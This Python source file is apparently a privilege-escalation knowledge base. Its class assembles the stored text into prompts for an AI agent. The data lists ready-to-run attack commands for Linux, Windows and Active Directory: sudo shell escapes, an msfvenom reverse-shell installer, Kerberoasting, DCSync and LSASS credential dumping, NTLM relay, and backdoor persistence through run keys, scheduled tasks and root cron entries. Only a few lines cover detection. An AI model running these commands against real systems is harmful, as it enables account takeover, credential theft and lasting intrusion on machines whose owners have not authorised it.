"""Privilege escalation knowledge base.

Deep knowledge about privilege escalation:
1. Linux privilege escalation
2. Windows privilege escalation
3. Container escape to host
4. Cloud IAM escalation
5. Application-level privilege escalation
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

import structlog

logger = structlog.get_logger()


@dataclass
class PrivescPattern:
    """A privilege escalation pattern."""
    pattern_id: str = ""
    name: str = ""
    category: str = ""
    severity: str = "critical"
    description: str = ""
    detection_strategy: str = ""
    tools: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.pattern_id,
            "name": self.name[:25],
            "category": self.category[:12],
        }


PRIVESC_PATTERNS: list[dict[str, Any]] = [
    {
        "id": "pe-001", "name": "Linux Privilege Escalation",
        "category": "linux", "severity": "critical",
        "desc": "Linux local privilege escalation techniques.",
        "detection": (
            "LINUX PRIVILEGE ESCALATION:\n"
            "SUID/SGID BINARIES:\n"
            "  find / -perm -4000 -type f 2>/dev/null  # SUID\n"
            "  find / -perm -2000 -type f 2>/dev/null  # SGID\n"
            "  # GTFOBins: https://gtfobins.github.io/\n"
            "  # Common exploitable SUID: nmap, vim, find, bash, cp, mv, nano\n"
            "SUDO MISCONFIGURATIONS:\n"
            "  sudo -l  # List sudo permissions\n"
            "  # (ALL) NOPASSWD: /usr/bin/vim → sudo vim -c ':!/bin/bash'\n"
            "  # (ALL) NOPASSWD: /usr/bin/find → sudo find / -exec /bin/bash \\;\n"
            "  # env_keep+=LD_PRELOAD → compile shared library\n"
            "CRON JOBS:\n"
            "  cat /etc/crontab\n"
            "  ls -la /etc/cron.d/\n"
            "  # Writable cron scripts\n"
            "  # Wildcard injection in tar, rsync\n"
            "  # PATH manipulation in cron environment\n"
            "CAPABILITIES:\n"
            "  getcap -r / 2>/dev/null\n"
            "  # cap_setuid+ep → change UID to root\n"
            "  # cap_dac_override → bypass file permissions\n"
            "  # cap_net_raw → packet sniffing\n"
            "KERNEL EXPLOITS:\n"
            "  uname -r  # Check kernel version\n"
            "  # Dirty Pipe (CVE-2022-0847): 5.8 <= kernel < 5.16.11\n"
            "  # Dirty COW (CVE-2016-5195): 2.6.22 <= kernel < 4.8.3\n"
            "  # PwnKit (CVE-2021-4034): pkexec polkit\n"
            "TOOLS:\n"
            "  linpeas.sh  # Linux privilege escalation scanner\n"
            "  pspy  # Monitor processes without root"
        ),
        "tools": ["linpeas", "pspy"],
    },
    {
        "id": "pe-002", "name": "Windows Privilege Escalation",
        "category": "windows", "severity": "critical",
        "desc": "Windows local privilege escalation techniques.",
        "detection": (
            "WINDOWS PRIVILEGE ESCALATION:\n"
            "SERVICE MISCONFIGURATIONS:\n"
            "  # Unquoted service paths\n"
            "  wmic service get name,pathname,startmode | findstr /v /i \"C:\\Windows\"\n"
            "  # Weak service permissions\n"
            "  accesschk.exe -uwcqv \"Everyone\" * /accepteula\n"
            "  # Modifiable service binaries\n"
            "  icacls <service_binary_path>\n"
            "TOKEN MANIPULATION:\n"
            "  # SeImpersonatePrivilege → Potato attacks\n"
            "  whoami /priv\n"
            "  # PrintSpoofer: SeImpersonatePrivilege → SYSTEM\n"
            "  PrintSpoofer.exe -i -c cmd\n"
            "  # JuicyPotato, RoguePotato, SweetPotato\n"
            "  # GodPotato: Works on all Windows versions\n"
            "ALWAYS INSTALL ELEVATED:\n"
            "  reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer \\\n"
            "    /v AlwaysInstallElevated\n"
            "  reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer \\\n"
            "    /v AlwaysInstallElevated\n"
            "  # Both = 1 → msfvenom -p windows/shell_reverse_tcp ... -f msi > shell.msi\n"
            "DLL HIJACKING:\n"
            "  # Missing DLLs in PATH\n"
            "  # Writable directories in system PATH\n"
            "  procmon.exe → Filter: Result=NAME NOT FOUND, Path ends .dll\n"
            "CREDENTIALS:\n"
            "  # SAM and SYSTEM hives\n"
            "  reg save HKLM\\SAM sam.hiv\n"
            "  reg save HKLM\\SYSTEM system.hiv\n"
            "  # Credential Manager\n"
            "  cmdkey /list\n"
            "  # Saved WiFi passwords\n"
            "  netsh wlan show profiles\n"
            "TOOLS:\n"
            "  winpeas.exe  # Windows privilege escalation scanner\n"
            "  Seatbelt.exe  # Security checks\n"
            "  SharpUp.exe  # Privilege escalation checks"
        ),
        "tools": ["winpeas", "seatbelt"],
    },
    {
        "id": "pe-003", "name": "Active Directory Escalation",
        "category": "ad", "severity": "critical",
        "desc": "Active Directory privilege escalation paths.",
        "detection": (
            "ACTIVE DIRECTORY ESCALATION:\n"
            "KERBEROASTING:\n"
            "  # Request TGS for service accounts\n"
            "  GetUserSPNs.py domain/user:pass -dc-ip <dc> -request\n"
            "  # Crack TGS offline\n"
            "  hashcat -m 13100 tgs_hashes.txt wordlist.txt\n"
            "AS-REP ROASTING:\n"
            "  # Accounts with no pre-auth\n"
            "  GetNPUsers.py domain/ -usersfile users.txt -dc-ip <dc>\n"
            "  hashcat -m 18200 asrep_hashes.txt wordlist.txt\n"
            "DCSync:\n"
            "  # Requires Replicating Directory Changes\n"
            "  secretsdump.py domain/admin:pass@<dc>\n"
            "  # mimikatz: lsadump::dcsync /user:krbtgt\n"
            "DELEGATION ABUSE:\n"
            "  - Unconstrained delegation: TGT capture\n"
            "  - Constrained delegation: S4U2Self + S4U2Proxy\n"
            "  - Resource-based constrained delegation (RBCD)\n"
            "ACL ABUSE:\n"
            "  # GenericAll on user → reset password\n"
            "  # WriteDacl → add GenericAll\n"
            "  # WriteOwner → take ownership\n"
            "  # ForceChangePassword\n"
            "  # AddMember → add to privileged group\n"
            "BLOODHOUND:\n"
            "  # Collect AD data\n"
            "  bloodhound-python -u user -p pass -d domain -dc dc01\n"
            "  # Find shortest path to Domain Admin\n"
            "  # Analyze ACL attack paths"
        ),
        "tools": ["impacket", "bloodhound", "mimikatz"],
    },
    {
        "id": "pe-004", "name": "Credential Harvesting",
        "category": "creds", "severity": "critical",
        "desc": "Post-exploitation credential harvesting.",
        "detection": (
            "CREDENTIAL HARVESTING:\n"
            "WINDOWS:\n"
            "  # LSASS memory dump\n"
            "  procdump.exe -ma lsass.exe lsass.dmp\n"
            "  mimikatz: sekurlsa::logonpasswords\n"
            "  # Comsvcs.dll (LOLBin)\n"
            "  rundll32.exe comsvcs.dll MiniDump <lsass_pid> lsass.dmp full\n"
            "  # NTDS.dit (domain hashes)\n"
            "  ntdsutil \"activate instance ntds\" \"ifm\" \"create full c:\\ntds\" quit quit\n"
            "  secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL\n"
            "LINUX:\n"
            "  # /etc/shadow\n"
            "  cat /etc/shadow  # If readable\n"
            "  # SSH keys\n"
            "  find / -name id_rsa 2>/dev/null\n"
            "  find / -name authorized_keys 2>/dev/null\n"
            "  # Memory scraping\n"
            "  strings /proc/*/maps 2>/dev/null | grep -i pass\n"
            "  # Bash history\n"
            "  cat ~/.bash_history | grep -i pass\n"
            "BROWSER CREDENTIALS:\n"
            "  # Chrome: Login Data SQLite DB\n"
            "  # Firefox: logins.json + key4.db\n"
            "  # Tools: LaZagne, SharpChrome, HackBrowserData\n"
            "NETWORK:\n"
            "  # Responder (LLMNR/NBT-NS poisoning)\n"
            "  responder -I eth0 -wrf\n"
            "  # ntlmrelayx (relay captured creds)\n"
            "  ntlmrelayx.py -tf targets.txt -smb2support"
        ),
        "tools": ["mimikatz", "responder", "lazagne"],
    },
    {
        "id": "pe-005", "name": "Post-Exploitation Persistence",
        "category": "persistence", "severity": "high",
        "desc": "Maintaining access after exploitation.",
        "detection": (
            "POST-EXPLOITATION PERSISTENCE:\n"
            "WINDOWS:\n"
            "  # Registry run keys\n"
            "  reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \\\n"
            "    /v backdoor /t REG_SZ /d C:\\backdoor.exe\n"
            "  # Scheduled tasks\n"
            "  schtasks /create /sc minute /mo 5 /tn backdoor /tr C:\\backdoor.exe\n"
            "  # WMI event subscription\n"
            "  # Service creation\n"
            "  sc create backdoor binpath=C:\\backdoor.exe start=auto\n"
            "  # DLL search order hijacking\n"
            "  # COM object hijacking\n"
            "LINUX:\n"
            "  # Cron job\n"
            "  echo '*/5 * * * * /tmp/backdoor' >> /var/spool/cron/crontabs/root\n"
            "  # SSH authorized keys\n"
            "  echo '<public_key>' >> ~/.ssh/authorized_keys\n"
            "  # Systemd service\n"
            "  # .bashrc modification\n"
            "  # LD_PRELOAD hijacking\n"
            "  # PAM backdoor\n"
            "DETECTION:\n"
            "  # Windows: Autoruns (Sysinternals)\n"
            "  autorunsc.exe -accepteula -a * -s\n"
            "  # Linux: Check common persistence locations\n"
            "  find / -newer /tmp/timestamp -type f 2>/dev/null\n"
            "  # Monitor for new persistence mechanisms\n"
            "  osquery: SELECT * FROM startup_items;"
        ),
        "tools": ["autoruns", "osquery"],
    },
]


class PrivescKB:
    """Privilege escalation knowledge base.

    Provides privilege escalation patterns
    injected into agent prompts.
    """

    def __init__(self) -> None:
        self._patterns: dict[str, PrivescPattern] = {}
        self._log = logger.bind(component="privesc_kb")
        self._load_patterns()

    def _load_patterns(self) -> None:
        """Load privesc patterns."""
        for data in PRIVESC_PATTERNS:
            pattern = PrivescPattern(
                pattern_id=data["id"],
                name=data["name"],
                category=data.get("category", ""),
                severity=data.get("severity", "critical"),
                description=data.get("desc", ""),
                detection_strategy=data.get("detection", ""),
                tools=data.get("tools", []),
            )
            self._patterns[pattern.pattern_id] = pattern

    def get_by_category(self, category: str) -> list[PrivescPattern]:
        """Get patterns by category."""
        return [
            p for p in self._patterns.values()
            if p.category.lower() == category.lower()
        ]

    def build_privesc_prompt(
        self,
        categories: list[str] | None = None,
        max_patterns: int = 4,
    ) -> str:
        """Build privilege escalation prompt."""
        lines = ["## Privilege Escalation Patterns\n"]
        count = 0
        for pattern in self._patterns.values():
            if categories and pattern.category.lower() not in [c.lower() for c in categories]:
                continue
            if count >= max_patterns:
                break
            lines.append(f"### {pattern.name} [{pattern.category.upper()}]")
            lines.append(pattern.detection_strategy)
            lines.append("")
            count += 1
        return "\n".join(lines)

    def get_stats(self) -> dict[str, Any]:
        cat_counts: dict[str, int] = {}
        for p in self._patterns.values():
            cat_counts[p.category] = cat_counts.get(p.category, 0) + 1
        return {
            "patterns": len(self._patterns),
            "by_category": cat_counts,
        }
